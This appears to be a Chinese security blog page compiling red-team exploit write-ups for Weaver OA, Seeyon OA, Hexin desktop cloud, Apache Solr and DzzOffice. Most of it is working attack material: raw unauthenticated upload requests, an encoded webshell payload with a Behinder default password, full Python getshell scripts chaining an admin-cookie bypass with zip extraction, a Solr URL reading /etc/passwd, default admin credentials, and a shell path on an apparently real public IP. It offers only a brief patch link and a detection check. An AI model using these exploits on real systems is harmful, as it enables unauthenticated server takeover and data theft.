<p>使用sysadmin    123450aA.登录系统</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%878.png"></p>
<h1 id="泛微OA9前台任意文件上传"><a href="#泛微OA9前台任意文件上传" class="headerlink" title="泛微OA9前台任意文件上传"></a>泛微OA9前台任意文件上传</h1><p>漏洞位于: <code>/page/exportImport/uploadOperation.jsp</code>文件中</p>
<p>Jsp流程大概是:判断请求是否是multipart请求,然就没有了,直接上传了,啊哈哈哈哈哈<br>重点关注File file=new File(savepath+filename),<br>Filename参数,是前台可控的,并且没有做任何过滤限制</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA9%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E5%9B%BE%E7%89%879.png"></p>
<p>利用非常简单,只要对着<br><code>127.0.0.1/page/exportImport/uploadOperation.jsp</code><br>来一个multipartRequest就可以,利用简单,自评高危!!</p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA9%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E5%9B%BE%E7%89%8710.png"></p>
<p>然后请求路径:<br><code>view-source:http://112.91.144.90:5006/page/exportImport/fileTransfer/1.jsp</code></p>
<p><img src="/image/%E6%B3%9B%E5%BE%AEOA9%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E5%9B%BE%E7%89%8711.png"></p>
<h1 id="和信创天云桌面命令执行"><a href="#和信创天云桌面命令执行" class="headerlink" title="和信创天云桌面命令执行"></a>和信创天云桌面命令执行</h1><pre><code>POST /Upload/upload_file.php?l=1 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Referer: x.x.x.x
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8
Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
Content-Length: 164

------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.png&quot;
Content-Type: image/avif

1
------WebKitFormBoundaryfcKRltGv--</code></pre>
<p><img src="/image/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image.png"></p>
<h1 id="致远OA-ajax-do-任意文件上传漏洞"><a href="#致远OA-ajax-do-任意文件上传漏洞" class="headerlink" title="致远OA ajax.do 任意文件上传漏洞"></a>致远OA ajax.do 任意文件上传漏洞</h1><p>致远OA A8 是一款流行的协同管理软件，在各中、大型企业机构中广泛使用。</p>
<p>由于致远OA旧版本某些接口能被未授权访问，并且部分函数存在过滤不足，攻击者通过构造恶意请求，权限绕过漏洞，可在无需登录的情况下上传恶意脚本文件，从而控制服务器</p>
<p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x</p>
<h3 id="一、首先测试漏洞环境是否存在"><a href="#一、首先测试漏洞环境是否存在" class="headerlink" title="一、首先测试漏洞环境是否存在"></a>一、首先测试漏洞环境是否存在</h3><p>POC验证漏洞存在否</p>
<pre><code>127.0.0.1:8002/seeyon/thirdpartyController.do.css/..;/ajax.do</code></pre>
<p><img src="/image/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/075d3dbde2ed3ec990e4b1e342ee8700.png"></p>
<p>利用PAYLOAD</p>
<pre><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1
Host: 127.0.0.1
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
loginPageURL=; login_locale=zh_CN;
Content-Type: application/x-www-form-urlencoded

managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</code></pre>
<p>检测方式可以通过managerMethod=toString的方式打印类名进行判断。</p>
<pre><code>def verify(self, first=False):
        target = self.scan_info[&#39;Target&#39;]
        try:
            headers = &#123;
                &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;
            &#125;
            url = urljoin(target, &#39;/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip&#39;)
            data = &quot;managerMethod=toString&quot;
            r1 = req(url, &#39;post&#39;,data=data,headers=headers,verify=False)
            if &#39;com.seeyon.ctp.common.formula.manager.FormulaManagerImpl&#39; in r1.text:
                log.highlight(&quot;found Seeyon AjaxAction File Upload&quot;)
                self.scan_info[&#39;Success&#39;] = True
                self.scan_info[&#39;Ret&#39;][&#39;VerifyInfo&#39;][&#39;URL&#39;] = url
                return
        except Exception as e:
            log.info(&quot;[*]Request to target URL fail! &#123;&#125;&quot;.format(e))</code></pre>
<p>利用成功：</p>
<p><img src="/image/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/490c91fe6eb8083e821cc41675117fa9.png"></p>
<p>利用失败：</p>
<p><img src="/image/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1cfdb4046346668a45062f6f5a3f775a.png"></p>
<pre><code>冰蝎3 默认马pass : rebeyond
webshell地址: http://127.0.0.1/seeyon/SeeyouUpdate1.jspx</code></pre>
<p>成功连接</p>
<p><img src="/image/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/fe049bc6974ea60dad1be71af0fc33b7.png"></p>
<p>内容木马名称都可以自主修改,只是做了gzip数据的压缩然后在进行url的编码，可以利用下面的工具</p>
<p>推荐清水川崎师傅的利用工具</p>
<p>还能应急响应，根据数据包找到木马在哪里，nb</p>
<p><img src="/image/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/db6b27a971e1f0a956eb4d1cacbbecd3.png"></p>
<p>安装最新补丁</p>
<p><a target="_blank" rel="noopener" href="http://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=1">http://service.seeyon.com/patchtools/tp.html#/patchList\?type=\%E5\%AE\%89\%E5\%85\%A8\%E8\%A1\%A5\%E4\%B8\%81\&amp;id=1</a></p>
<h1 id="致远OA-前台getshell-复现"><a href="#致远OA-前台getshell-复现" class="headerlink" title="致远OA 前台getshell 复现"></a>致远OA 前台getshell 复现</h1><p>作者: print(“”) 分类: <a target="_blank" rel="noopener" href="https://www.o2oxy.cn/category/%e5%ae%89%e5%85%a8/%e5%a4%8d%e7%8e%b0">漏洞复现</a> 发布时间: 2021-04-09 17:32 阅读次数: 525 次 </p>
<p>首先是一个获取管理cookie的漏洞。然后上传压缩文件进行解压。达到getshell的目的</p>
<pre><code>POST /seeyon/thirdpartyController.do HTTP/1.1
Host: 192.168.10.2
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 133
Content-Type: application/x-www-form-urlencoded

method=access&amp;enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&amp;clientPath=127.0.0.1</code></pre>
<p>上传压缩包</p>
<pre><code>POST /seeyon/fileUpload.do?method=processUpload HTTP/1.1
Host:192.168.10.2
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.25.1
Cookie: JSESSIONID=3495C4DEF87200EA323B1CA31E3B7DF5
Content-Length: 841
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name=&quot;firstSave&quot;

true
--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name=&quot;callMethod&quot;

resizeLayout
--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name=&quot;isEncrypt&quot;

0
--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name=&quot;takeOver&quot;

false
--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name=&quot;type&quot;

0
--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;11.png&quot;
Content-Type: image/png

111
--59229605f98b8cf290a7b8908b34616b--</code></pre>
<p>然后解压</p>
<pre><code>POST /seeyon/ajax.do HTTP/1.1
Host: 192.168.10.2
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=BDF7358D4C35C6D2BB99FADFEE21F913
Content-Length: 157

method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=uploadPageLayoutAttachment&amp;arguments=%5B0%2C%222021-04-09%22%2C%225818374431215601542%22%5D</code></pre>
<p>getshell 脚本</p>
<pre><code># coding: utf-8
import requests
import re
import time

proxy = &#123;&#39;http&#39;: &#39;127.0.0.1:8080&#39;, &#39;https&#39;: &#39;127.0.0.1:8080&#39;&#125;</code></pre>
<p>​    </p>
<pre><code>def seeyon_new_rce(targeturl):
    orgurl = targeturl

    # 通过请求直接获取管理员权限cookie
    targeturl = orgurl + &#39;seeyon/thirdpartyController.do&#39;
    post=&#123;&quot;method&quot;:&quot;access&quot;,&quot;enc&quot;:&quot;TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&quot;,&quot;clientPath&quot;:&quot;127.0.0.1&quot;&#125;
    response = requests.post(url=targeturl,data=post,proxies=proxy, timeout=60,verify=False)
    rsp = &quot;&quot;
    if response and response.status_code == 200 and &#39;set-cookie&#39; in str(response.headers).lower():
        cookies = response.cookies
        cookies = requests.utils.dict_from_cookiejar(cookies)
        # 上传压缩文件
        aaa=cookies[&#39;JSESSIONID&#39;]
        print(aaa)
        targeturl = orgurl + &#39;seeyon/fileUpload.do?method=processUpload&#39;
        files = [(&#39;file1&#39;, (&#39;11.png&#39;, open(&#39;1.zip&#39;, &#39;r&#39;), &#39;image/png&#39;))]
        print()
        headers = &#123;&#39;Cookie&#39;:&quot;JSESSIONID=%s&quot;%aaa&#125;
        data = &#123;&#39;callMethod&#39;: &#39;resizeLayout&#39;, &#39;firstSave&#39;: &quot;true&quot;, &#39;takeOver&#39;:&quot;false&quot;, &quot;type&quot;: &#39;0&#39;,
                &#39;isEncrypt&#39;: &quot;0&quot;&#125;
        response = requests.post(url=targeturl,files=files,data=data, headers=headers,proxies=proxy,timeout=60,verify=False)
        if response.text:
            reg = re.findall(&#39;fileurls=fileurls\+&quot;,&quot;\+\&#39;(.+)\&#39;&#39;,response.text,re.I)
            print(reg)
            if len(reg)==0:
                exit(&quot;匹配失败&quot;)
            fileid=reg[0]
            targeturl = orgurl + &#39;seeyon/ajax.do&#39;
            datestr = time.strftime(&#39;%Y-%m-%d&#39;)
            post = &#39;method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=uploadPageLayoutAttachment&amp;arguments=%5B0%2C%22&#39; + datestr + &#39;%22%2C%22&#39; + fileid + &#39;%22%5D&#39;
            #headers = &#123;&#39;Cookie&#39;: cookies&#125;
            headers[&#39;Content-Type&#39;]=&quot;application/x-www-form-urlencoded&quot;
            response = requests.post(targeturl, data=post,headers=headers,proxies=proxy,timeout=60,verify=False)
            print(response.text)

seeyon_new_rce(&quot;https://baidu.com/&quot;)</code></pre>
<p>​    </p>
<p>shell地址：<code>/seeyon/common/designer/pageLayout/a2345678.jsp</code></p>
<p>这个压缩包得自己生成了。压缩包里面一定得带有layout.xml  这个文件。空文件也行</p>
<p>例如这样的</p>
<p><img src="/image/%E8%87%B4%E8%BF%9COA%20%E5%89%8D%E5%8F%B0getshell%20%E5%A4%8D%E7%8E%B0/%25E5%25BE%25AE%25E4%25BF%25A1%25E6%2588%25AA%25E5%259B%25BE_20210409173136.png"></p>
<p>演示的压缩包如下：</p>
<p><a target="_blank" rel="noopener" href="https://www.o2oxy.cn/wp-content/uploads/2021/04/1.zip">https://www.o2oxy.cn/wp-content/uploads/2021/04/1.zip</a></p>
<h1 id="致远OA任意文件上传"><a href="#致远OA任意文件上传" class="headerlink" title="致远OA任意文件上传"></a>致远OA任意文件上传</h1><p>致远OA系统漏洞</p>
<p>漏洞细节：利用了两个漏洞</p>
<p>1）通过请求直接获取管理员权限cookie</p>
<p>2）通过上传一个压缩文件，调用接口进行文件在解压时会利用解压过程的漏洞利用获取webshell</p>
<pre><code>def seeyon_new_rce(targeturl):
orgurl=targeturl
#通过请求直接获取管理员权限cookie
   targeturl=orgurl+&#39;seeyon/thirdpartyController.do&#39;
post=&#39;method=access&amp;enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&amp;clientPath=127.0.0.1&#39;
   request = SendRequest(targeturl,post)
   response = request.send()
   rsp = &quot;&quot;
   if response and response.code == 200 and &#39;set-cookie&#39; in str(response.headers).lower():
       cookies =  get_response_cookies(response.headers)
 #上传压缩文件
       targeturl=orgurl+&#39;seeyon/fileUpload.do?method=processUpload&#39;
       base64post=&#39;LS04OWViY2U2MC04MTc0LTQ2MTItOGRjMy03MTdjZTZhMDQyYWMNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZTEiOyBmaWxlbmFtZT0iMS5wbmciDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KQ29udGVudC1MZW5ndGg6IDg3OA0KDQpQSwMEFAAICAgA3XQkUQAAAAAAAAAAAAAAAAoAAABsYXlvdXQueG1s4wIAUEsHCJMG1zIDAAAAAQAAAFBLAwQUAAgICADddCRRAAAAAAAAAAAAAAAADwAAAC4uL3YzeG1haW5lLmpzcMWW207jMBCG7/sUC1JvuECJ7TiJxKJ9kL3pIUUgoaLVwvOv8MxqvthNG1oQN6NoYs/p/2fGd8tfL6uH4cfj88v+z9+f10+rt9Xt4/725np5v7hbXv1+rarok9wkWb/L1pt01btsGvuO6bvtkgymiUOSIb8bjtoPot/Z3wibrUtyjRi6z7GpuUicvXlRO3KyKm51+S0vt7Z2Xu5Ghwh73JpRE42thUepQ5/XXNGR+mzt5CgjhywCsnOGmtg5kTvwVcQjshtMfyI7ZOTSGV/Zd6SvTcGuFhXoJlDYJm4vEFs0vxKD5oWo9OQONYFHVi/UqGRAJXsghfMRvHX464CU35oU78qijcmSpfOzIDMlqiYaOmJfPR6PdmPfHr3gRdOAIRFdUOh9b3ofjANiR6Ia1Qf4aneswC7kInNJsfOGjvZOBVx2djKgesr8ruA/Job/3kimmIlOVFYEoIxISpSF1SHpG3+4/jrBBjAN3+JLbHqwhZOhbb+qbpovphajbXyuL6diWEPT260DNjuTl8+TMzsx2XdraKifYsjEHuFkVgvo9OPcIENGDCxnDjjJ+mvu7CnYEQ07boRdnVeMzJ/VKefFWWyfqdrqvnCwVtvJsMu9X1K3+SdHE2yiQ785o6LCZIXii5ksc1I3RWsavYW3hNxiF9PCgfqQjcNEzCGPWaX4qnObTjZ+nZ+U/f4BNAfLl++Q8u0xyrHYqlMc4Kub7y71wo1QdtmMd+CJeXX5O79EBL5G73m+b5PNUL5vMaXl7gcwouWzOutALsyoQPDM9wBtljOWewo46pascxwVQezB0d4Br/5zcrG8/wdQSwcIyIdUE2sCAAC3DgAAUEsBAhQAFAAICAgA3XQkUZMG1zIDAAAAAQAAAAoAAAAAAAAAAAAAAAAAAAAAAGxheW91dC54bWxQSwECFAAUAAgICADddCRRyIdUE2sCAAC3DgAADwAAAAAAAAAAAAAAAAA7AAAALi4vdjN4bWFpbmUuanNwUEsFBgAAAAACAAIAdQAAAOMCAAAAAA0KLS04OWViY2U2MC04MTc0LTQ2MTItOGRjMy03MTdjZTZhMDQyYWMNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iY2FsbE1ldGhvZCINCkNvbnRlbnQtTGVuZ3RoOiAxMg0KDQpyZXNpemVMYXlvdXQNCi0tODllYmNlNjAtODE3NC00NjEyLThkYzMtNzE3Y2U2YTA0MmFjDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpcnN0U2F2ZSINCkNvbnRlbnQtTGVuZ3RoOiA0DQoNCnRydWUNCi0tODllYmNlNjAtODE3NC00NjEyLThkYzMtNzE3Y2U2YTA0MmFjDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InRha2VPdmVyIg0KQ29udGVudC1MZW5ndGg6IDUNCg0KZmFsc2UNCi0tODllYmNlNjAtODE3NC00NjEyLThkYzMtNzE3Y2U2YTA0MmFjDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InR5cGUiDQpDb250ZW50LUxlbmd0aDogMQ0KDQowDQotLTg5ZWJjZTYwLTgxNzQtNDYxMi04ZGMzLTcxN2NlNmEwNDJhYw0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJpc0VuY3J5cHQiDQpDb250ZW50LUxlbmd0aDogMQ0KDQowDQotLTg5ZWJjZTYwLTgxNzQtNDYxMi04ZGMzLTcxN2NlNmEwNDJhYy0t&#39;
       myrandstr=random_str(8)
       post=base64.b64decode(base64post).replace(&#39;v3xmaine.jsp&#39;,myrandstr+&#39;.txt&#39;)
       headers=&#123;&#39;Content-Type&#39;: &#39;multipart/form-data; boundary=89ebce60-8174-4612-8dc3-717ce6a042ac&#39;,&#39;Cookie&#39;:cookies&#125;
       request = SendRequest(targeturl,data=post,headers=headers)
       response = request.send()
       if  response:
           try:
               rsp = response.read(11 * 1000 * 1000)
           except Exception as e:
               if (&quot;IncompleteRead&quot; in str(e)):
                   rsp = e.partial
           reg=re.compile(&#39;fileurls=fileurls\+&quot;,&quot;\+\&#39;([\-\d]+)\&#39;&#39;)
           matchs=reg.findall(rsp)
           if matchs:
               fileid=matchs[0]

#触发文件解压漏洞，获取webshell
              targeturl=orgurl+&#39;seeyon/ajax.do&#39;
               datestr=time.strftime(&#39;%Y-%m-%d&#39;)
               post=&#39;method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=uploadPageLayoutAttachment&amp;arguments=%5B0%2C%22&#39;+datestr+&#39;%22%2C%22&#39;+fileid+&#39;%22%5D&#39;
               headers=&#123;&#39;Cookie&#39;:cookies&#125;
               request = SendRequest(targeturl,data=post,headers=headers)
               response = request.send()
               if response:
                   rsp_headers=response.headers
                   try:
                       rsp = response.read(11 * 1000 * 1000)
                   except Exception as e:
                       if (&quot;IncompleteRead&quot; in str(e)):
                           rsp = e.partial
                   if response.code == 500 and (&quot;Error on&quot; in rsp):
                       testrule=orgurl+&#39;seeyon/common/designer/pageLayout/&#39;+myrandstr+&#39;.txt&#39;
                       if get_url_content(testrule):
                           #漏洞存在</code></pre>
<h1 id="apache-Solr-存在任意文件读取"><a href="#apache-Solr-存在任意文件读取" class="headerlink" title="apache Solr 存在任意文件读取"></a>apache Solr 存在任意文件读取</h1><p>访问:<code>http://ip//solr/db/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd</code>  (db为存在的应用名)</p>
<h1 id="DzzOffice最新版RCE-随机数问题"><a href="#DzzOffice最新版RCE-随机数问题" class="headerlink" title="DzzOffice最新版RCE(随机数问题)"></a>DzzOffice最新版RCE(随机数问题)</h1><p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/1_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.webp"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/2_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.webp"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/3_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.webp"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/4_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.webp"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.png"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/1_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.png"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/2_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.png"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.dat"></p>
<p><img src="/image/2021.4.9%20HVV%20%20%E6%83%85%E6%8A%A5%E5%85%B1%E4%BA%AB/1_640wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1.dat"></p>
